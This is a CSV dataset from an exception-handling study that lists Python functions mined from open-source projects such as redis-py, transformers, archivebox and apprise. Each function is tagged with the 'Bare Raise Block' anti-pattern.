,project,file,function,func_body,anti_pattern,count
131,redis-py,/home/r4ph/desenv/phd/exception-miner/projects/py/redis-py/redis/asyncio/client.py,_disconnect_reset_raise,"async def _disconnect_reset_raise(self, conn, error):
        """"""
        Close the connection, reset watching state and
        raise an exception if we were watching,
        retry_on_timeout is not set,
        or the error is not a TimeoutError
        """"""
        await conn.disconnect()
        # if we were already watching a variable, the watch is no longer
        # valid since this connection has died. raise a WatchError, which
        # indicates the user should retry this transaction.
        if self.watching:
            await self.aclose()
            raise WatchError(
                ""A ConnectionError occurred on while watching one or more keys""
            )
        # if retry_on_timeout is not set, or the error is not
        # a TimeoutError, raise it
        if not (conn.retry_on_timeout and isinstance(error, TimeoutError)):
            await self.aclose()
            raise",Bare Raise Block,1
132,sentry,/home/r4ph/desenv/exception-miner/projects/py/sentry/src/sentry/integrations/base.py,raise_error,"def raise_error(self, exc: Exception, identity: Optional[Identity] = None) -> None:
        if isinstance(exc, ApiUnauthorized):
            raise InvalidIdentity(self.message_from_error(exc), identity=identity).with_traceback(
                sys.exc_info()[2]
            )
        elif isinstance(exc, ApiError):
            if exc.json:
                error_fields = self.error_fields_from_json(exc.json)
                if error_fields is not None:
                    raise IntegrationFormError(error_fields).with_traceback(sys.exc_info()[2])

            raise IntegrationError(self.message_from_error(exc)).with_traceback(sys.exc_info()[2])
        elif isinstance(exc, IntegrationError):
            raise
        else:
            self.logger.exception(str(exc))
            raise IntegrationError(self.message_from_error(exc)).with_traceback(sys.exc_info()[2])",Bare Raise Block,1
133,freqtrade,/home/r4ph/desenv/exception-miner/projects/py/freqtrade/freqtrade/exchange/exchange.py,_async_get_historic_ohlcv,"async def _async_get_historic_ohlcv(self, pair: str, timeframe: str,
                                        since_ms: int, candle_type: CandleType,
                                        is_new_pair: bool = False, raise_: bool = False,
                                        until_ms: Optional[int] = None
                                        ) -> OHLCVResponse:
        """"""
        Download historic ohlcv
        :param is_new_pair: used by binance subclass to allow ""fast"" new pair downloading
        :param candle_type: Any of the enum CandleType (must match trading mode!)
        """"""

        one_call = timeframe_to_msecs(timeframe) * self.ohlcv_candle_limit(
            timeframe, candle_type, since_ms)
        logger.debug(
            ""one_call: %s msecs (%s)"",
            one_call,
            arrow.utcnow().shift(seconds=one_call // 1000).humanize(only_distance=True)
        )
        input_coroutines = [self._async_get_candle_history(
            pair, timeframe, candle_type, since) for since in
            range(since_ms, until_ms or (arrow.utcnow().int_timestamp * 1000), one_call)]

        data: List = []
        # Chunk requests into batches of 100 to avoid overwelming ccxt Throttling
        for input_coro in chunks(input_coroutines, 100):

            results = await asyncio.gather(*input_coro, return_exceptions=True)
            for res in results:
                if isinstance(res, Exception):
                    logger.warning(f""Async code raised an exception: {repr(res)}"")
                    if raise_:
                        raise
                    continue
                else:
                    # Deconstruct tuple if it's not an exception
                    p, _, c, new_data, _ = res
                    if p == pair and c == candle_type:
                        data.extend(new_data)
        # Sort data again after extending the result - above calls return in ""async order""
        data = sorted(data, key=lambda x: x[0])
        return pair, timeframe, candle_type, data, self._ohlcv_partial_candle",Bare Raise Block,1
134,transformers,/home/r4ph/desenv/exception-miner/projects/py/transformers/tests/models/pegasus/test_modeling_pegasus.py,assert_tensors_close,"def assert_tensors_close(a, b, atol=1e-12, prefix=""""):
    """"""If tensors have different shapes, different values or a and b are not both tensors, raise a nice Assertion error.""""""
    if a is None and b is None:
        return True
    try:
        if torch.allclose(a, b, atol=atol):
            return True
        raise
    except Exception:
        pct_different = (torch.gt((a - b).abs(), atol)).float().mean().item()
        if a.numel() > 100:
            msg = f""tensor values are {pct_different:.1%} percent different.""
        else:
            msg = f""{a} != {b}""
        if prefix:
            msg = prefix + "": "" + msg
        raise AssertionError(msg)",Bare Raise Block,1
135,easyocr,/home/r4ph/desenv/exception-miner/projects/py/easyocr/unit_test/unit_test.py,validate_all,"def validate_all(self, results, solutions, dtypes):
        if not isinstance(results, list):
            results = [results]
        if not isinstance(solutions, list):
            solutions = [solutions]
        if not isinstance(dtypes, list):
            dtypes = [dtypes]
        
        
        validation = []
        for (result, solution, dtype) in zip(results, solutions, dtypes):
            if (not self.is_list_or_tuple(result)
                and not self.is_list_or_tuple(result)
                and not self.is_list_or_tuple(result)
                ): 
                validation.append(self.validate(result, solution, type(solution)))
            elif(self.is_list_or_tuple(result)
                and self.is_list_or_tuple(result)
                and self.is_list_or_tuple(result)
                ):
                validation.append(self.validate_all(results, solutions, type(solution)))
            else:
                raise
        return all(validation)",Bare Raise Block,1
136,psutil,/home/r4ph/desenv/phd/exception-miner/projects/py/psutil/scripts/internal/winmake.py,safe_rmtree,"def safe_rmtree(path):
        def onerror(fun, path, excinfo):
            exc = excinfo[1]
            if exc.errno != errno.ENOENT:
                raise

        existed = os.path.isdir(path)
        shutil.rmtree(path, onerror=onerror)
        if existed:
            safe_print(""rmdir -f %s"" % path)",Bare Raise Block,1
137,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.6.2/.pybuild/cpython3_3.8_archivebox/build/archivebox/extractors/title.py,save_title,"def save_title(link: Link, out_dir: Optional[Path]=None, timeout: int=TIMEOUT) -> ArchiveResult:
    """"""try to guess the page's title from its content""""""

    from core.models import Snapshot

    output: ArchiveOutput = None
    cmd = [
        CURL_BINARY,
        *CURL_ARGS,
        '--max-time', str(timeout),
        *(['--user-agent', '{}'.format(CURL_USER_AGENT)] if CURL_USER_AGENT else []),
        *([] if CHECK_SSL_VALIDITY else ['--insecure']),
        link.url,
    ]
    status = 'succeeded'
    timer = TimedProgress(timeout, prefix='      ')
    try:
        html = download_url(link.url, timeout=timeout)
        try:
            # try using relatively strict html parser first
            parser = TitleParser()
            parser.feed(html)
            output = parser.title
            if output is None:
                raise
        except Exception:
            # fallback to regex that can handle broken/malformed html
            output = extract_title_with_regex(html)
        
        # if title is better than the one in the db, update db with new title
        if isinstance(output, str) and output:
            if not link.title or len(output) >= len(link.title):
                Snapshot.objects.filter(url=link.url,
                                        timestamp=link.timestamp)\
                                .update(title=output)
        else:
            # if no content was returned, dont save a title (because it might be a temporary error)
            if not html:
                raise ArchiveError('Unable to detect page title')
            # output = html[:128]       # use first bit of content as the title
            output = link.base_url      # use the filename as the title (better UX)
    except Exception as err:
        status = 'failed'
        output = err
    finally:
        timer.end()

    return ArchiveResult(
        cmd=cmd,
        pwd=str(out_dir),
        cmd_version=CURL_VERSION,
        output=output,
        status=status,
        **timer.stats,
    )",Bare Raise Block,1
138,sanic,/home/r4ph/desenv/exception-miner/projects/py/sanic/tests/test_named_routes.py,test_versioned_named_routes_get,"def test_versioned_named_routes_get(method):
    app = Sanic(""app"")

    bp = Blueprint(""test_bp"", url_prefix=""/bp"")

    method = method.lower()
    route_name = f""route_{method}""
    route_name2 = f""route2_{method}""

    func = getattr(app, method)
    if callable(func):

        @func(f""/{method}"", version=1, name=route_name)
        def handler(request):
            return text(""OK"")

    else:
        raise

    func = getattr(bp, method)
    if callable(func):

        @func(f""/{method}"", version=1, name=route_name2)
        def handler2(request):
            return text(""OK"")

    else:
        raise

    app.blueprint(bp)

    assert (
        app.router.routes_all[
            (
                ""v1"",
                method,
            )
        ].name
        == f""app.{route_name}""
    )

    route = app.router.routes_all[
        (
            ""v1"",
            ""bp"",
            method,
        )
    ]
    assert route.name == f""app.test_bp.{route_name2}""

    assert app.url_for(route_name) == f""/v1/{method}""
    url = app.url_for(f""test_bp.{route_name2}"")
    assert url == f""/v1/bp/{method}""
    with pytest.raises(URLBuildError):
        app.url_for(""handler"")",Bare Raise Block,1
139,gunicorn,/home/r4ph/desenv/phd/exception-miner/projects/py/gunicorn/examples/websocket/websocket.py,__call__,"def __call__(self, environ, start_response):
        if not (environ.get('HTTP_CONNECTION').find('Upgrade') != -1 and
            environ['HTTP_UPGRADE'].lower() == 'websocket'):
            # need to check a few more things here for true compliance
            start_response('400 Bad Request', [('Connection','close')])
            return []

        sock = environ['gunicorn.socket']

        version = environ.get('HTTP_SEC_WEBSOCKET_VERSION')

        ws = WebSocket(sock, environ, version)

        handshake_reply = (""HTTP/1.1 101 Switching Protocols\r\n""
                   ""Upgrade: websocket\r\n""
                   ""Connection: Upgrade\r\n"")

        key = environ.get('HTTP_SEC_WEBSOCKET_KEY')
        if key:
            ws_key = base64.b64decode(key)
            if len(ws_key) != 16:
                start_response('400 Bad Request', [('Connection','close')])
                return []

            protocols = []
            subprotocols = environ.get('HTTP_SEC_WEBSOCKET_PROTOCOL')
            ws_protocols = []
            if subprotocols:
                for s in subprotocols.split(','):
                    s = s.strip()
                    if s in protocols:
                        ws_protocols.append(s)
            if ws_protocols:
                handshake_reply += 'Sec-WebSocket-Protocol: %s\r\n' % ', '.join(ws_protocols)

            exts = []
            extensions = environ.get('HTTP_SEC_WEBSOCKET_EXTENSIONS')
            ws_extensions = []
            if extensions:
                for ext in extensions.split(','):
                    ext = ext.strip()
                    if ext in exts:
                        ws_extensions.append(ext)
            if ws_extensions:
                handshake_reply += 'Sec-WebSocket-Extensions: %s\r\n' % ', '.join(ws_extensions)

            key_hash = sha1()
            key_hash.update(key.encode())
            key_hash.update(WS_KEY)

            handshake_reply +=  (
                ""Sec-WebSocket-Origin: %s\r\n""
                ""Sec-WebSocket-Location: ws://%s%s\r\n""
                ""Sec-WebSocket-Version: %s\r\n""
                ""Sec-WebSocket-Accept: %s\r\n\r\n""
                 % (
                    environ.get('HTTP_ORIGIN'),
                    environ.get('HTTP_HOST'),
                    ws.path,
                    version,
                    base64.b64encode(key_hash.digest()).decode()
                ))

        else:

            handshake_reply += (
                       ""WebSocket-Origin: %s\r\n""
                       ""WebSocket-Location: ws://%s%s\r\n\r\n"" % (
                            environ.get('HTTP_ORIGIN'),
                            environ.get('HTTP_HOST'),
                            ws.path))

        sock.sendall(handshake_reply.encode())

        try:
            self.handler(ws)
        except BrokenPipeError:
            pass
        else:
            raise
        # use this undocumented feature of grainbows to ensure that it
        # doesn't barf on the fact that we didn't call start_response
        return ALREADY_HANDLED",Bare Raise Block,1
140,falcon,/home/r4ph/desenv/phd/exception-miner/projects/py/falcon/tests/asgi/_asgi_test_app.py,create_app,"def create_app():
    app = falcon.asgi.App()
    bucket = Bucket()
    lifespan_handler = LifespanHandler()

    app.add_route('/', Things())
    app.add_route('/bucket', bucket)
    app.add_route('/bucket/drops', bucket, suffix='drops')
    app.add_route('/events', Events())
    app.add_route('/forms', Multipart())
    app.add_route('/jars', TestJar())
    app.add_route('/feeds/{feed_id}', Feed())

    app.add_middleware(lifespan_handler)

    async def _on_ws_error(req, resp, error, params, ws=None):
        if not ws:
            raise

        if ws.unaccepted:
            await ws.accept()

        if not ws.closed:
            await ws.send_text(error.__class__.__name__)
            await ws.close()

    app.add_error_handler(falcon.errors.OperationNotAllowed, _on_ws_error)
    app.add_error_handler(ValueError, _on_ws_error)

    return app",Bare Raise Block,1
141,transformers,/home/r4ph/desenv/exception-miner/projects/py/transformers/tests/models/mbart/test_modeling_mbart.py,assert_tensors_close,"def assert_tensors_close(a, b, atol=1e-12, prefix=""""):
    """"""If tensors have different shapes, different values or a and b are not both tensors, raise a nice Assertion error.""""""
    if a is None and b is None:
        return True
    try:
        if torch.allclose(a, b, atol=atol):
            return True
        raise
    except Exception:
        pct_different = (torch.gt((a - b).abs(), atol)).float().mean().item()
        if a.numel() > 100:
            msg = f""tensor values are {pct_different:.1%} percent different.""
        else:
            msg = f""{a} != {b}""
        if prefix:
            msg = prefix + "": "" + msg
        raise AssertionError(msg)",Bare Raise Block,1
142,networkx,/home/r4ph/desenv/phd/exception-miner/projects/py/networkx/networkx/readwrite/gexf.py,make_graph,"def make_graph(self, graph_xml):
        # start with empty DiGraph or MultiDiGraph
        edgedefault = graph_xml.get(""defaultedgetype"", None)
        if edgedefault == ""directed"":
            G = nx.MultiDiGraph()
        else:
            G = nx.MultiGraph()

        # graph attributes
        graph_name = graph_xml.get(""name"", """")
        if graph_name != """":
            G.graph[""name""] = graph_name
        graph_start = graph_xml.get(""start"")
        if graph_start is not None:
            G.graph[""start""] = graph_start
        graph_end = graph_xml.get(""end"")
        if graph_end is not None:
            G.graph[""end""] = graph_end
        graph_mode = graph_xml.get(""mode"", """")
        if graph_mode == ""dynamic"":
            G.graph[""mode""] = ""dynamic""
        else:
            G.graph[""mode""] = ""static""

        # timeformat
        self.timeformat = graph_xml.get(""timeformat"")
        if self.timeformat == ""date"":
            self.timeformat = ""string""

        # node and edge attributes
        attributes_elements = graph_xml.findall(f""{{{self.NS_GEXF}}}attributes"")
        # dictionaries to hold attributes and attribute defaults
        node_attr = {}
        node_default = {}
        edge_attr = {}
        edge_default = {}
        for a in attributes_elements:
            attr_class = a.get(""class"")
            if attr_class == ""node"":
                na, nd = self.find_gexf_attributes(a)
                node_attr.update(na)
                node_default.update(nd)
                G.graph[""node_default""] = node_default
            elif attr_class == ""edge"":
                ea, ed = self.find_gexf_attributes(a)
                edge_attr.update(ea)
                edge_default.update(ed)
                G.graph[""edge_default""] = edge_default
            else:
                raise  # unknown attribute class

        # Hack to handle Gephi0.7beta bug
        # add weight attribute
        ea = {""weight"": {""type"": ""double"", ""mode"": ""static"", ""title"": ""weight""}}
        ed = {}
        edge_attr.update(ea)
        edge_default.update(ed)
        G.graph[""edge_default""] = edge_default

        # add nodes
        nodes_element = graph_xml.find(f""{{{self.NS_GEXF}}}nodes"")
        if nodes_element is not None:
            for node_xml in nodes_element.findall(f""{{{self.NS_GEXF}}}node""):
                self.add_node(G, node_xml, node_attr)

        # add edges
        edges_element = graph_xml.find(f""{{{self.NS_GEXF}}}edges"")
        if edges_element is not None:
            for edge_xml in edges_element.findall(f""{{{self.NS_GEXF}}}edge""):
                self.add_edge(G, edge_xml, edge_attr)

        # switch to Graph or DiGraph if no parallel edges were found.
        if self.simple_graph:
            if G.is_directed():
                G = nx.DiGraph(G)
            else:
                G = nx.Graph(G)
        return G",Bare Raise Block,1
143,pupy,/home/r4ph/desenv/phd/exception-miner/projects/py/pupy/pupy/packages/all/pupyutils/basic_cmds.py,rm,"def rm(path):
    path = try_unicode(path)
    path = os.path.expanduser(path)
    path = os.path.expandvars(path)

    files = 0
    exception = None

    for path in glob.iglob(path):
        if os.path.exists(path):
            files += 1
            if os.path.isdir(path):
                shutil.rmtree(path, ignore_errors=True)
            else:
                try:
                    os.remove(path)
                except OSError, e:
                    exception = e
        else:
            raise ValueError(""File/directory does not exists"")

    if not files:
        raise ValueError(""File/directory does not exists"")

    if files == 1 and exception:
        try_exc_utf8(exception)
        raise",Bare Raise Block,1
144,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.5.4/.pybuild/cpython3_3.8_archivebox/build/archivebox/extractors/title.py,save_title,"def save_title(link: Link, out_dir: Optional[Path]=None, timeout: int=TIMEOUT) -> ArchiveResult:
    """"""try to guess the page's title from its content""""""

    from core.models import Snapshot

    output: ArchiveOutput = None
    cmd = [
        CURL_BINARY,
        *CURL_ARGS,
        '--max-time', str(timeout),
        *(['--user-agent', '{}'.format(CURL_USER_AGENT)] if CURL_USER_AGENT else []),
        *([] if CHECK_SSL_VALIDITY else ['--insecure']),
        link.url,
    ]
    status = 'succeeded'
    timer = TimedProgress(timeout, prefix='      ')
    try:
        html = download_url(link.url, timeout=timeout)
        try:
            # try using relatively strict html parser first
            parser = TitleParser()
            parser.feed(html)
            output = parser.title
            if output is None:
                raise
        except Exception:
            # fallback to regex that can handle broken/malformed html
            output = extract_title_with_regex(html)
        
        # if title is better than the one in the db, update db with new title
        if isinstance(output, str) and output:
            if not link.title or len(output) >= len(link.title):
                Snapshot.objects.filter(url=link.url,
                                        timestamp=link.timestamp)\
                                .update(title=output)
        else:
            # if no content was returned, dont save a title (because it might be a temporary error)
            if not html:
                raise ArchiveError('Unable to detect page title')
            # output = html[:128]       # use first bit of content as the title
            output = link.base_url      # use the filename as the title (better UX)
    except Exception as err:
        status = 'failed'
        output = err
    finally:
        timer.end()

    return ArchiveResult(
        cmd=cmd,
        pwd=str(out_dir),
        cmd_version=CURL_VERSION,
        output=output,
        status=status,
        **timer.stats,
    )",Bare Raise Block,1
145,jina,/home/r4ph/desenv/phd/exception-miner/projects/py/jina/jina/serve/runtimes/gateway/graph/topology_graph.py,_handle_internalnetworkerror,"def _handle_internalnetworkerror(self, err):
            err_code = err.code()
            if err_code == grpc.StatusCode.UNAVAILABLE:
                err._details = (
                    err.details()
                    + f' |Gateway: Communication error with deployment {self.name} at address(es) {err.dest_addr}. '
                    f'Head or worker(s) may be down.'
                )
                raise err
            elif err_code == grpc.StatusCode.DEADLINE_EXCEEDED:
                err._details = (
                    err.details()
                    + f'|Gateway: Connection with deployment {self.name} at address(es) {err.dest_addr} could be established, but timed out.'
                    f' You can increase the allowed time by setting `timeout_send` in your Flow YAML `with` block or Flow `__init__()` method.'
                )
                raise err
            elif err_code == grpc.StatusCode.NOT_FOUND:
                err._details = (
                    err.details()
                    + f'\n|Gateway: Connection error with deployment `{self.name}` at address(es) {err.dest_addr}.'
                    f' Connection with {err.dest_addr} succeeded, but `{self.name}` was not found.'
                    f' Possibly `{self.name}` is behind an API gateway but not reachable.'
                )
                raise err
            else:
                raise",Bare Raise Block,1
146,transformers,/home/r4ph/desenv/exception-miner/projects/py/transformers/tests/models/pegasus_x/test_modeling_pegasus_x.py,assert_tensors_close,"def assert_tensors_close(a, b, atol=1e-12, prefix=""""):
    """"""If tensors have different shapes, different values or a and b are not both tensors, raise a nice Assertion error.""""""
    if a is None and b is None:
        return True
    try:
        if torch.allclose(a, b, atol=atol):
            return True
        raise
    except Exception:
        pct_different = (torch.gt((a - b).abs(), atol)).float().mean().item()
        if a.numel() > 100:
            msg = f""tensor values are {pct_different:.1%} percent different.""
        else:
            msg = f""{a} != {b}""
        if prefix:
            msg = prefix + "": "" + msg
        raise AssertionError(msg)",Bare Raise Block,1
147,nni,/home/r4ph/desenv/phd/exception-miner/projects/py/nni/examples/trials/systems_auto_tuning/opevo/src/compiler_auto_tune_stable.py,search_op_config,"def search_op_config(code_only=False):
  tvm_target = 'cuda'
  logging.getLogger('autotvm').setLevel(logging.DEBUG)
  logging.getLogger('autotvm').addHandler(logging.StreamHandler(sys.stdout))

  default_tune_op = importlib.import_module('templates.' + (os.environ['OP']))
  print('  >> Backend = %s, Python PID = %s, Task = %s;' % (backend, os.getpid(), default_tune_op.__name__))

  task = autotvm.task.create(default_tune_op.get_template_op, args=(), target=tvm_target)
  op_attributes = default_tune_op.op_attributes
  op_summary = '_'.join([k + str(op_attributes[k]) for k in op_attributes])

  def json_to_config(json_dict):
    config = ConfigEntity.from_json_dict({""i"": -1, ""t"": """", ""c"": None, ""e"": json_dict})
    return config

  def config_to_json(config):
    jobj = config.to_json_dict()['e']
    json_dict = dict()
    for i in range(len(jobj)):
      assert(jobj[i][1] in ['sp', 'ot'])
      json_dict[jobj[i][0]] = jobj[i][2]
    return json_dict

  num_trials = int(os.environ['STEP']) if 'STEP' in os.environ else 0

  if 'CONFIG' in os.environ:
    params_given = json.loads(os.environ['CONFIG'])
    print(""====>> [Current Config Option]"", os.environ['CONFIG'])

    trial_config = []
    for key in params_given:
      trial_config.append([key, ""sp"" if type(params_given[key]) is list else ""ot"", params_given[key]])
    best_config = json_to_config(trial_config)

  elif 'NNI_TRIAL_JOB_ID' in os.environ:
    show_search_space(task.config_space, os.environ['NNI_TRIAL_JOB_ID'] == '@')
    import nni
    params_given = nni.get_next_parameter()
    if params_given is None:
      raise
    local_dir_id = os.environ['NNI_TRIAL_JOB_ID']
    t = run_config_entity(params_given, local_dir_id)
    gflops = compute_gflops(task.flop, t)
    print('[TVM-engine] Final entity result is: %g' % gflops)
    try:
      nni.report_final_result(gflops)
    except:
      print('[TVM-engine] (not reporting final result to NNI.)')
    exit(0)

  elif num_trials > 0:
    n_parallel = 16 if 'BATCH' not in os.environ else int(os.environ['BATCH'])
    measure_option = autotvm.measure_option(
        builder=autotvm.LocalBuilder(n_parallel=n_parallel),
        runner=autotvm.LocalRunner(repeat=3, min_repeat_ms=100, timeout=4)
    )
    # if DO_TUNING:
    tuner = autotvm.tuner.XGBTuner(task, num_threads=8)

    from concurrent.futures import ThreadPoolExecutor
    thread_pool = ThreadPoolExecutor(max_workers=n_parallel)

    dev_num = get_tuning_parallism()

    def parse_configs(task, configs):
      results = []
      futures = []
      expected_timecost = 'inf'
      for i in range(len(configs)):
        futures.append(thread_pool.submit(run_config_entity, config_to_json(configs[i]), i, expected_timecost, i % dev_num))
      for i in range(len(configs)):
        t = futures[i].result()
        if t < tuner.task.best_config[0]:
          tuner.task.best_config = (t, configs[i])
        results.append(autotvm.measure.MeasureResult(costs=(t,), error_no=0, all_cost=i, timestamp=time.time()))
      return results

    tuner.task.best_config = (float('inf'), None)
    tuner.parse_configs = parse_configs

    tuner.tune(n_trial=num_trials, measure_option=measure_option, callbacks=[])
    assert(not math.isinf(tuner.task.best_config[0]))
    best_config = tuner.task.best_config[1]
    print('\n[Best Config]', json.dumps(config_to_json(best_config)))
  else:
    best_config = task.config_space

  with ApplyConfig(best_config):
    with tvm.target.create(tvm_target):
      s, arg_bufs = default_tune_op.get_template_op()
      lower_source = str(tvm.lower(s, arg_bufs, simple_mode=True))

      # Verify Source Code
      assert(len(('\n' + lower_source).split('\nproduce ')) == 2)
      lower_file = local_get_dir_file('my_kernel.lower')
      with open(lower_file, 'w') as fp:
        fp.write(lower_source)

      max_threads_per_block = tvm.ndarray.gpu(0).max_threads_per_block
      max_shared_memory_per_block = tvm.ndarray.gpu(0).max_shared_memory_per_block

      thread_extents = subprocess.getoutput(""cat '%s' | grep '^ *// attr.*iter_var.*thread_extent'"" % (lower_file)).split('\n')
      reserved_axes = dict({'threadIdx.x': None, 'threadIdx.y': None, 'threadIdx.z': None, 'blockIdx.x': None, 'blockIdx.y': None, 'blockIdx.z': None})
      for line in thread_extents:
        thread_name = line.split('[iter_var(')[-1].split(',')[0]
        if thread_name in reserved_axes:
          thread_val = int(line.split('thread_extent = ')[-1])
          if reserved_axes[thread_name] is not None:
            if reserved_axes[thread_name] != thread_val:
              assert(False)
          else:
            reserved_axes[thread_name] = thread_val
        else:
          raise Exception(""Invalid thread_axis name: %s"" % thread_name)

      num_threads = 1
      for thread_name in ['threadIdx.x', 'threadIdx.y', 'threadIdx.z']:
        if reserved_axes[thread_name] is not None:
          num_threads *= reserved_axes[thread_name]
      if num_threads > max_threads_per_block:
        raise Exception(""Invalid kernel code: using num_threads %d > max_threads_per_block %d"" % (num_threads, max_threads_per_block))

      allocate_shared = subprocess.getoutput(""cat '%s' | grep 'allocate .*shared\[.*\]'"" % (lower_file)).split('\n')
      shared_memory_in_bytes = 0
      for line in allocate_shared:
        if not line:
          continue
        parts = line.split('[')
        assert(len(parts) == 2)
        parts = parts[1].split(' * ')
        assert(len(parts) == 2)
        assert(parts[1][-1] == ']')
        allocate_type = parts[0]
        allocate_val = int(parts[1][:-1])
        if allocate_type in ['float32']:
          shared_memory_in_bytes += allocate_val * 4
        else:
          raise Exception(""Unrecognized shared memory data type: %s"" % allocate_type)
      if shared_memory_in_bytes > max_shared_memory_per_block:
        raise Exception(""Invalid kernel code: using shared_memory_in_bytes %d > max_shared_memory_per_block %d"" % (shared_memory_in_bytes, max_shared_memory_per_block))

      func = tvm.build(s, arg_bufs, tvm_target, name='template_op')

  assert(len(func.imported_modules) == 1)
  device_source = translate_code(func.imported_modules[0].get_source())

  if code_only:
    return device_source

  if lower_source and device_source:
    tune_slot_id = 0 if 'CUDA_VISIBLE_DEVICES' not in os.environ else int(os.environ['CUDA_VISIBLE_DEVICES'])
    exec_fd, _ = system_lock([tune_slot_id])
    gpu_id = 0
    ctx = tvm.context(tvm_target, gpu_id)
    tensors, outs = [], []
    for arg in arg_bufs:
      shape = [int(x) for x in arg.shape]
      is_output = arg.op.__class__ != tvm.tensor.PlaceholderOp
      from tvm._ffi.ndarray import empty
      td = empty(shape, arg.dtype, ctx)
      if is_output:
        outs.append(td)
      tensors.append(td)

    def timeout_handler():
      print(""Error: Timeout during Kernel warmup"")
      os._exit(1)

    my_timer = Timer(10, timeout_handler, [])
    my_timer.start()
    # Warmup
    func(*tensors)
    tvm.ndarray.gpu(gpu_id).sync()
    # Estimate
    t_start = time.time()
    func(*tensors)
    tvm.ndarray.gpu(gpu_id).sync()
    t_diff = time.time() - t_start
    my_timer.cancel()
    del my_timer

    num_runs = max(3, min(100, math.floor(1.0 / t_diff)))
    timeout_seconds = math.ceil((num_runs + 5) * t_diff)
    my_timer = Timer(timeout_seconds, timeout_handler, [])
    my_timer.start()
    timer_f = func.time_evaluator(func.entry_name, ctx, number=num_runs)
    t = timer_f(*tensors).mean
    my_timer.cancel()
    exec_fd()

    gflops = compute_gflops(task.flop, t)
    print(""[TVM-engine] Average time cost of %d runs = %g ms, %g gflops."" % (num_runs, t * 1e3, gflops))

    with open(local_get_dir_file('result.txt'), 'w') as fp:
      fp.write(str(t))",Bare Raise Block,1
148,apprise,/home/r4ph/desenv/phd/exception-miner/projects/py/apprise/apprise/plugins/NotifyPagerDuty.py,__init__,"def __init__(self, apikey, integrationkey=None, source=None,
                 component=None, group=None, class_id=None,
                 include_image=True, click=None, details=None,
                 region_name=None, severity=None, **kwargs):
        """"""
        Initialize Pager Duty Object
        """"""
        super().__init__(**kwargs)

        # Long-Lived Access token (generated from User Profile)
        self.apikey = validate_regex(apikey)
        if not self.apikey:
            msg = 'An invalid Pager Duty API Key ' \
                  '({}) was specified.'.format(apikey)
            self.logger.warning(msg)
            raise TypeError(msg)

        self.integration_key = validate_regex(integrationkey)
        if not self.integration_key:
            msg = 'An invalid Pager Duty Routing Key ' \
                  '({}) was specified.'.format(integrationkey)
            self.logger.warning(msg)
            raise TypeError(msg)

        # An Optional Source
        self.source = self.template_tokens['source']['default']
        if source:
            self.source = validate_regex(source)
            if not self.source:
                msg = 'An invalid Pager Duty Notification Source ' \
                      '({}) was specified.'.format(source)
                self.logger.warning(msg)
                raise TypeError(msg)
        else:
            self.component = self.template_tokens['source']['default']

        # An Optional Component
        self.component = self.template_tokens['component']['default']
        if component:
            self.component = validate_regex(component)
            if not self.component:
                msg = 'An invalid Pager Duty Notification Component ' \
                      '({}) was specified.'.format(component)
                self.logger.warning(msg)
                raise TypeError(msg)
        else:
            self.component = self.template_tokens['component']['default']

        # Store our region
        try:
            self.region_name = self.default_region \
                if region_name is None else region_name.lower()

            if self.region_name not in PAGERDUTY_REGIONS:
                # allow the outer except to handle this common response
                raise
        except:
            # Invalid region specified
            msg = 'The PagerDuty region specified ({}) is invalid.' \
                  .format(region_name)
            self.logger.warning(msg)
            raise TypeError(msg)

        # The severity (if specified)
        self.severity = \
            None if severity is None else next((
                s for s in PAGERDUTY_SEVERITIES
                if str(s).lower().startswith(severity)), False)

        if self.severity is False:
            # Invalid severity specified
            msg = 'The PagerDuty severity specified ({}) is invalid.' \
                  .format(severity)
            self.logger.warning(msg)
            raise TypeError(msg)

        # A clickthrough option for notifications
        self.click = click

        # Store Class ID if specified
        self.class_id = class_id

        # Store Group if specified
        self.group = group

        self.details = {}
        if details:
            # Store our extra details
            self.details.update(details)

        # Display our Apprise Image
        self.include_image = include_image

        return",Bare Raise Block,1
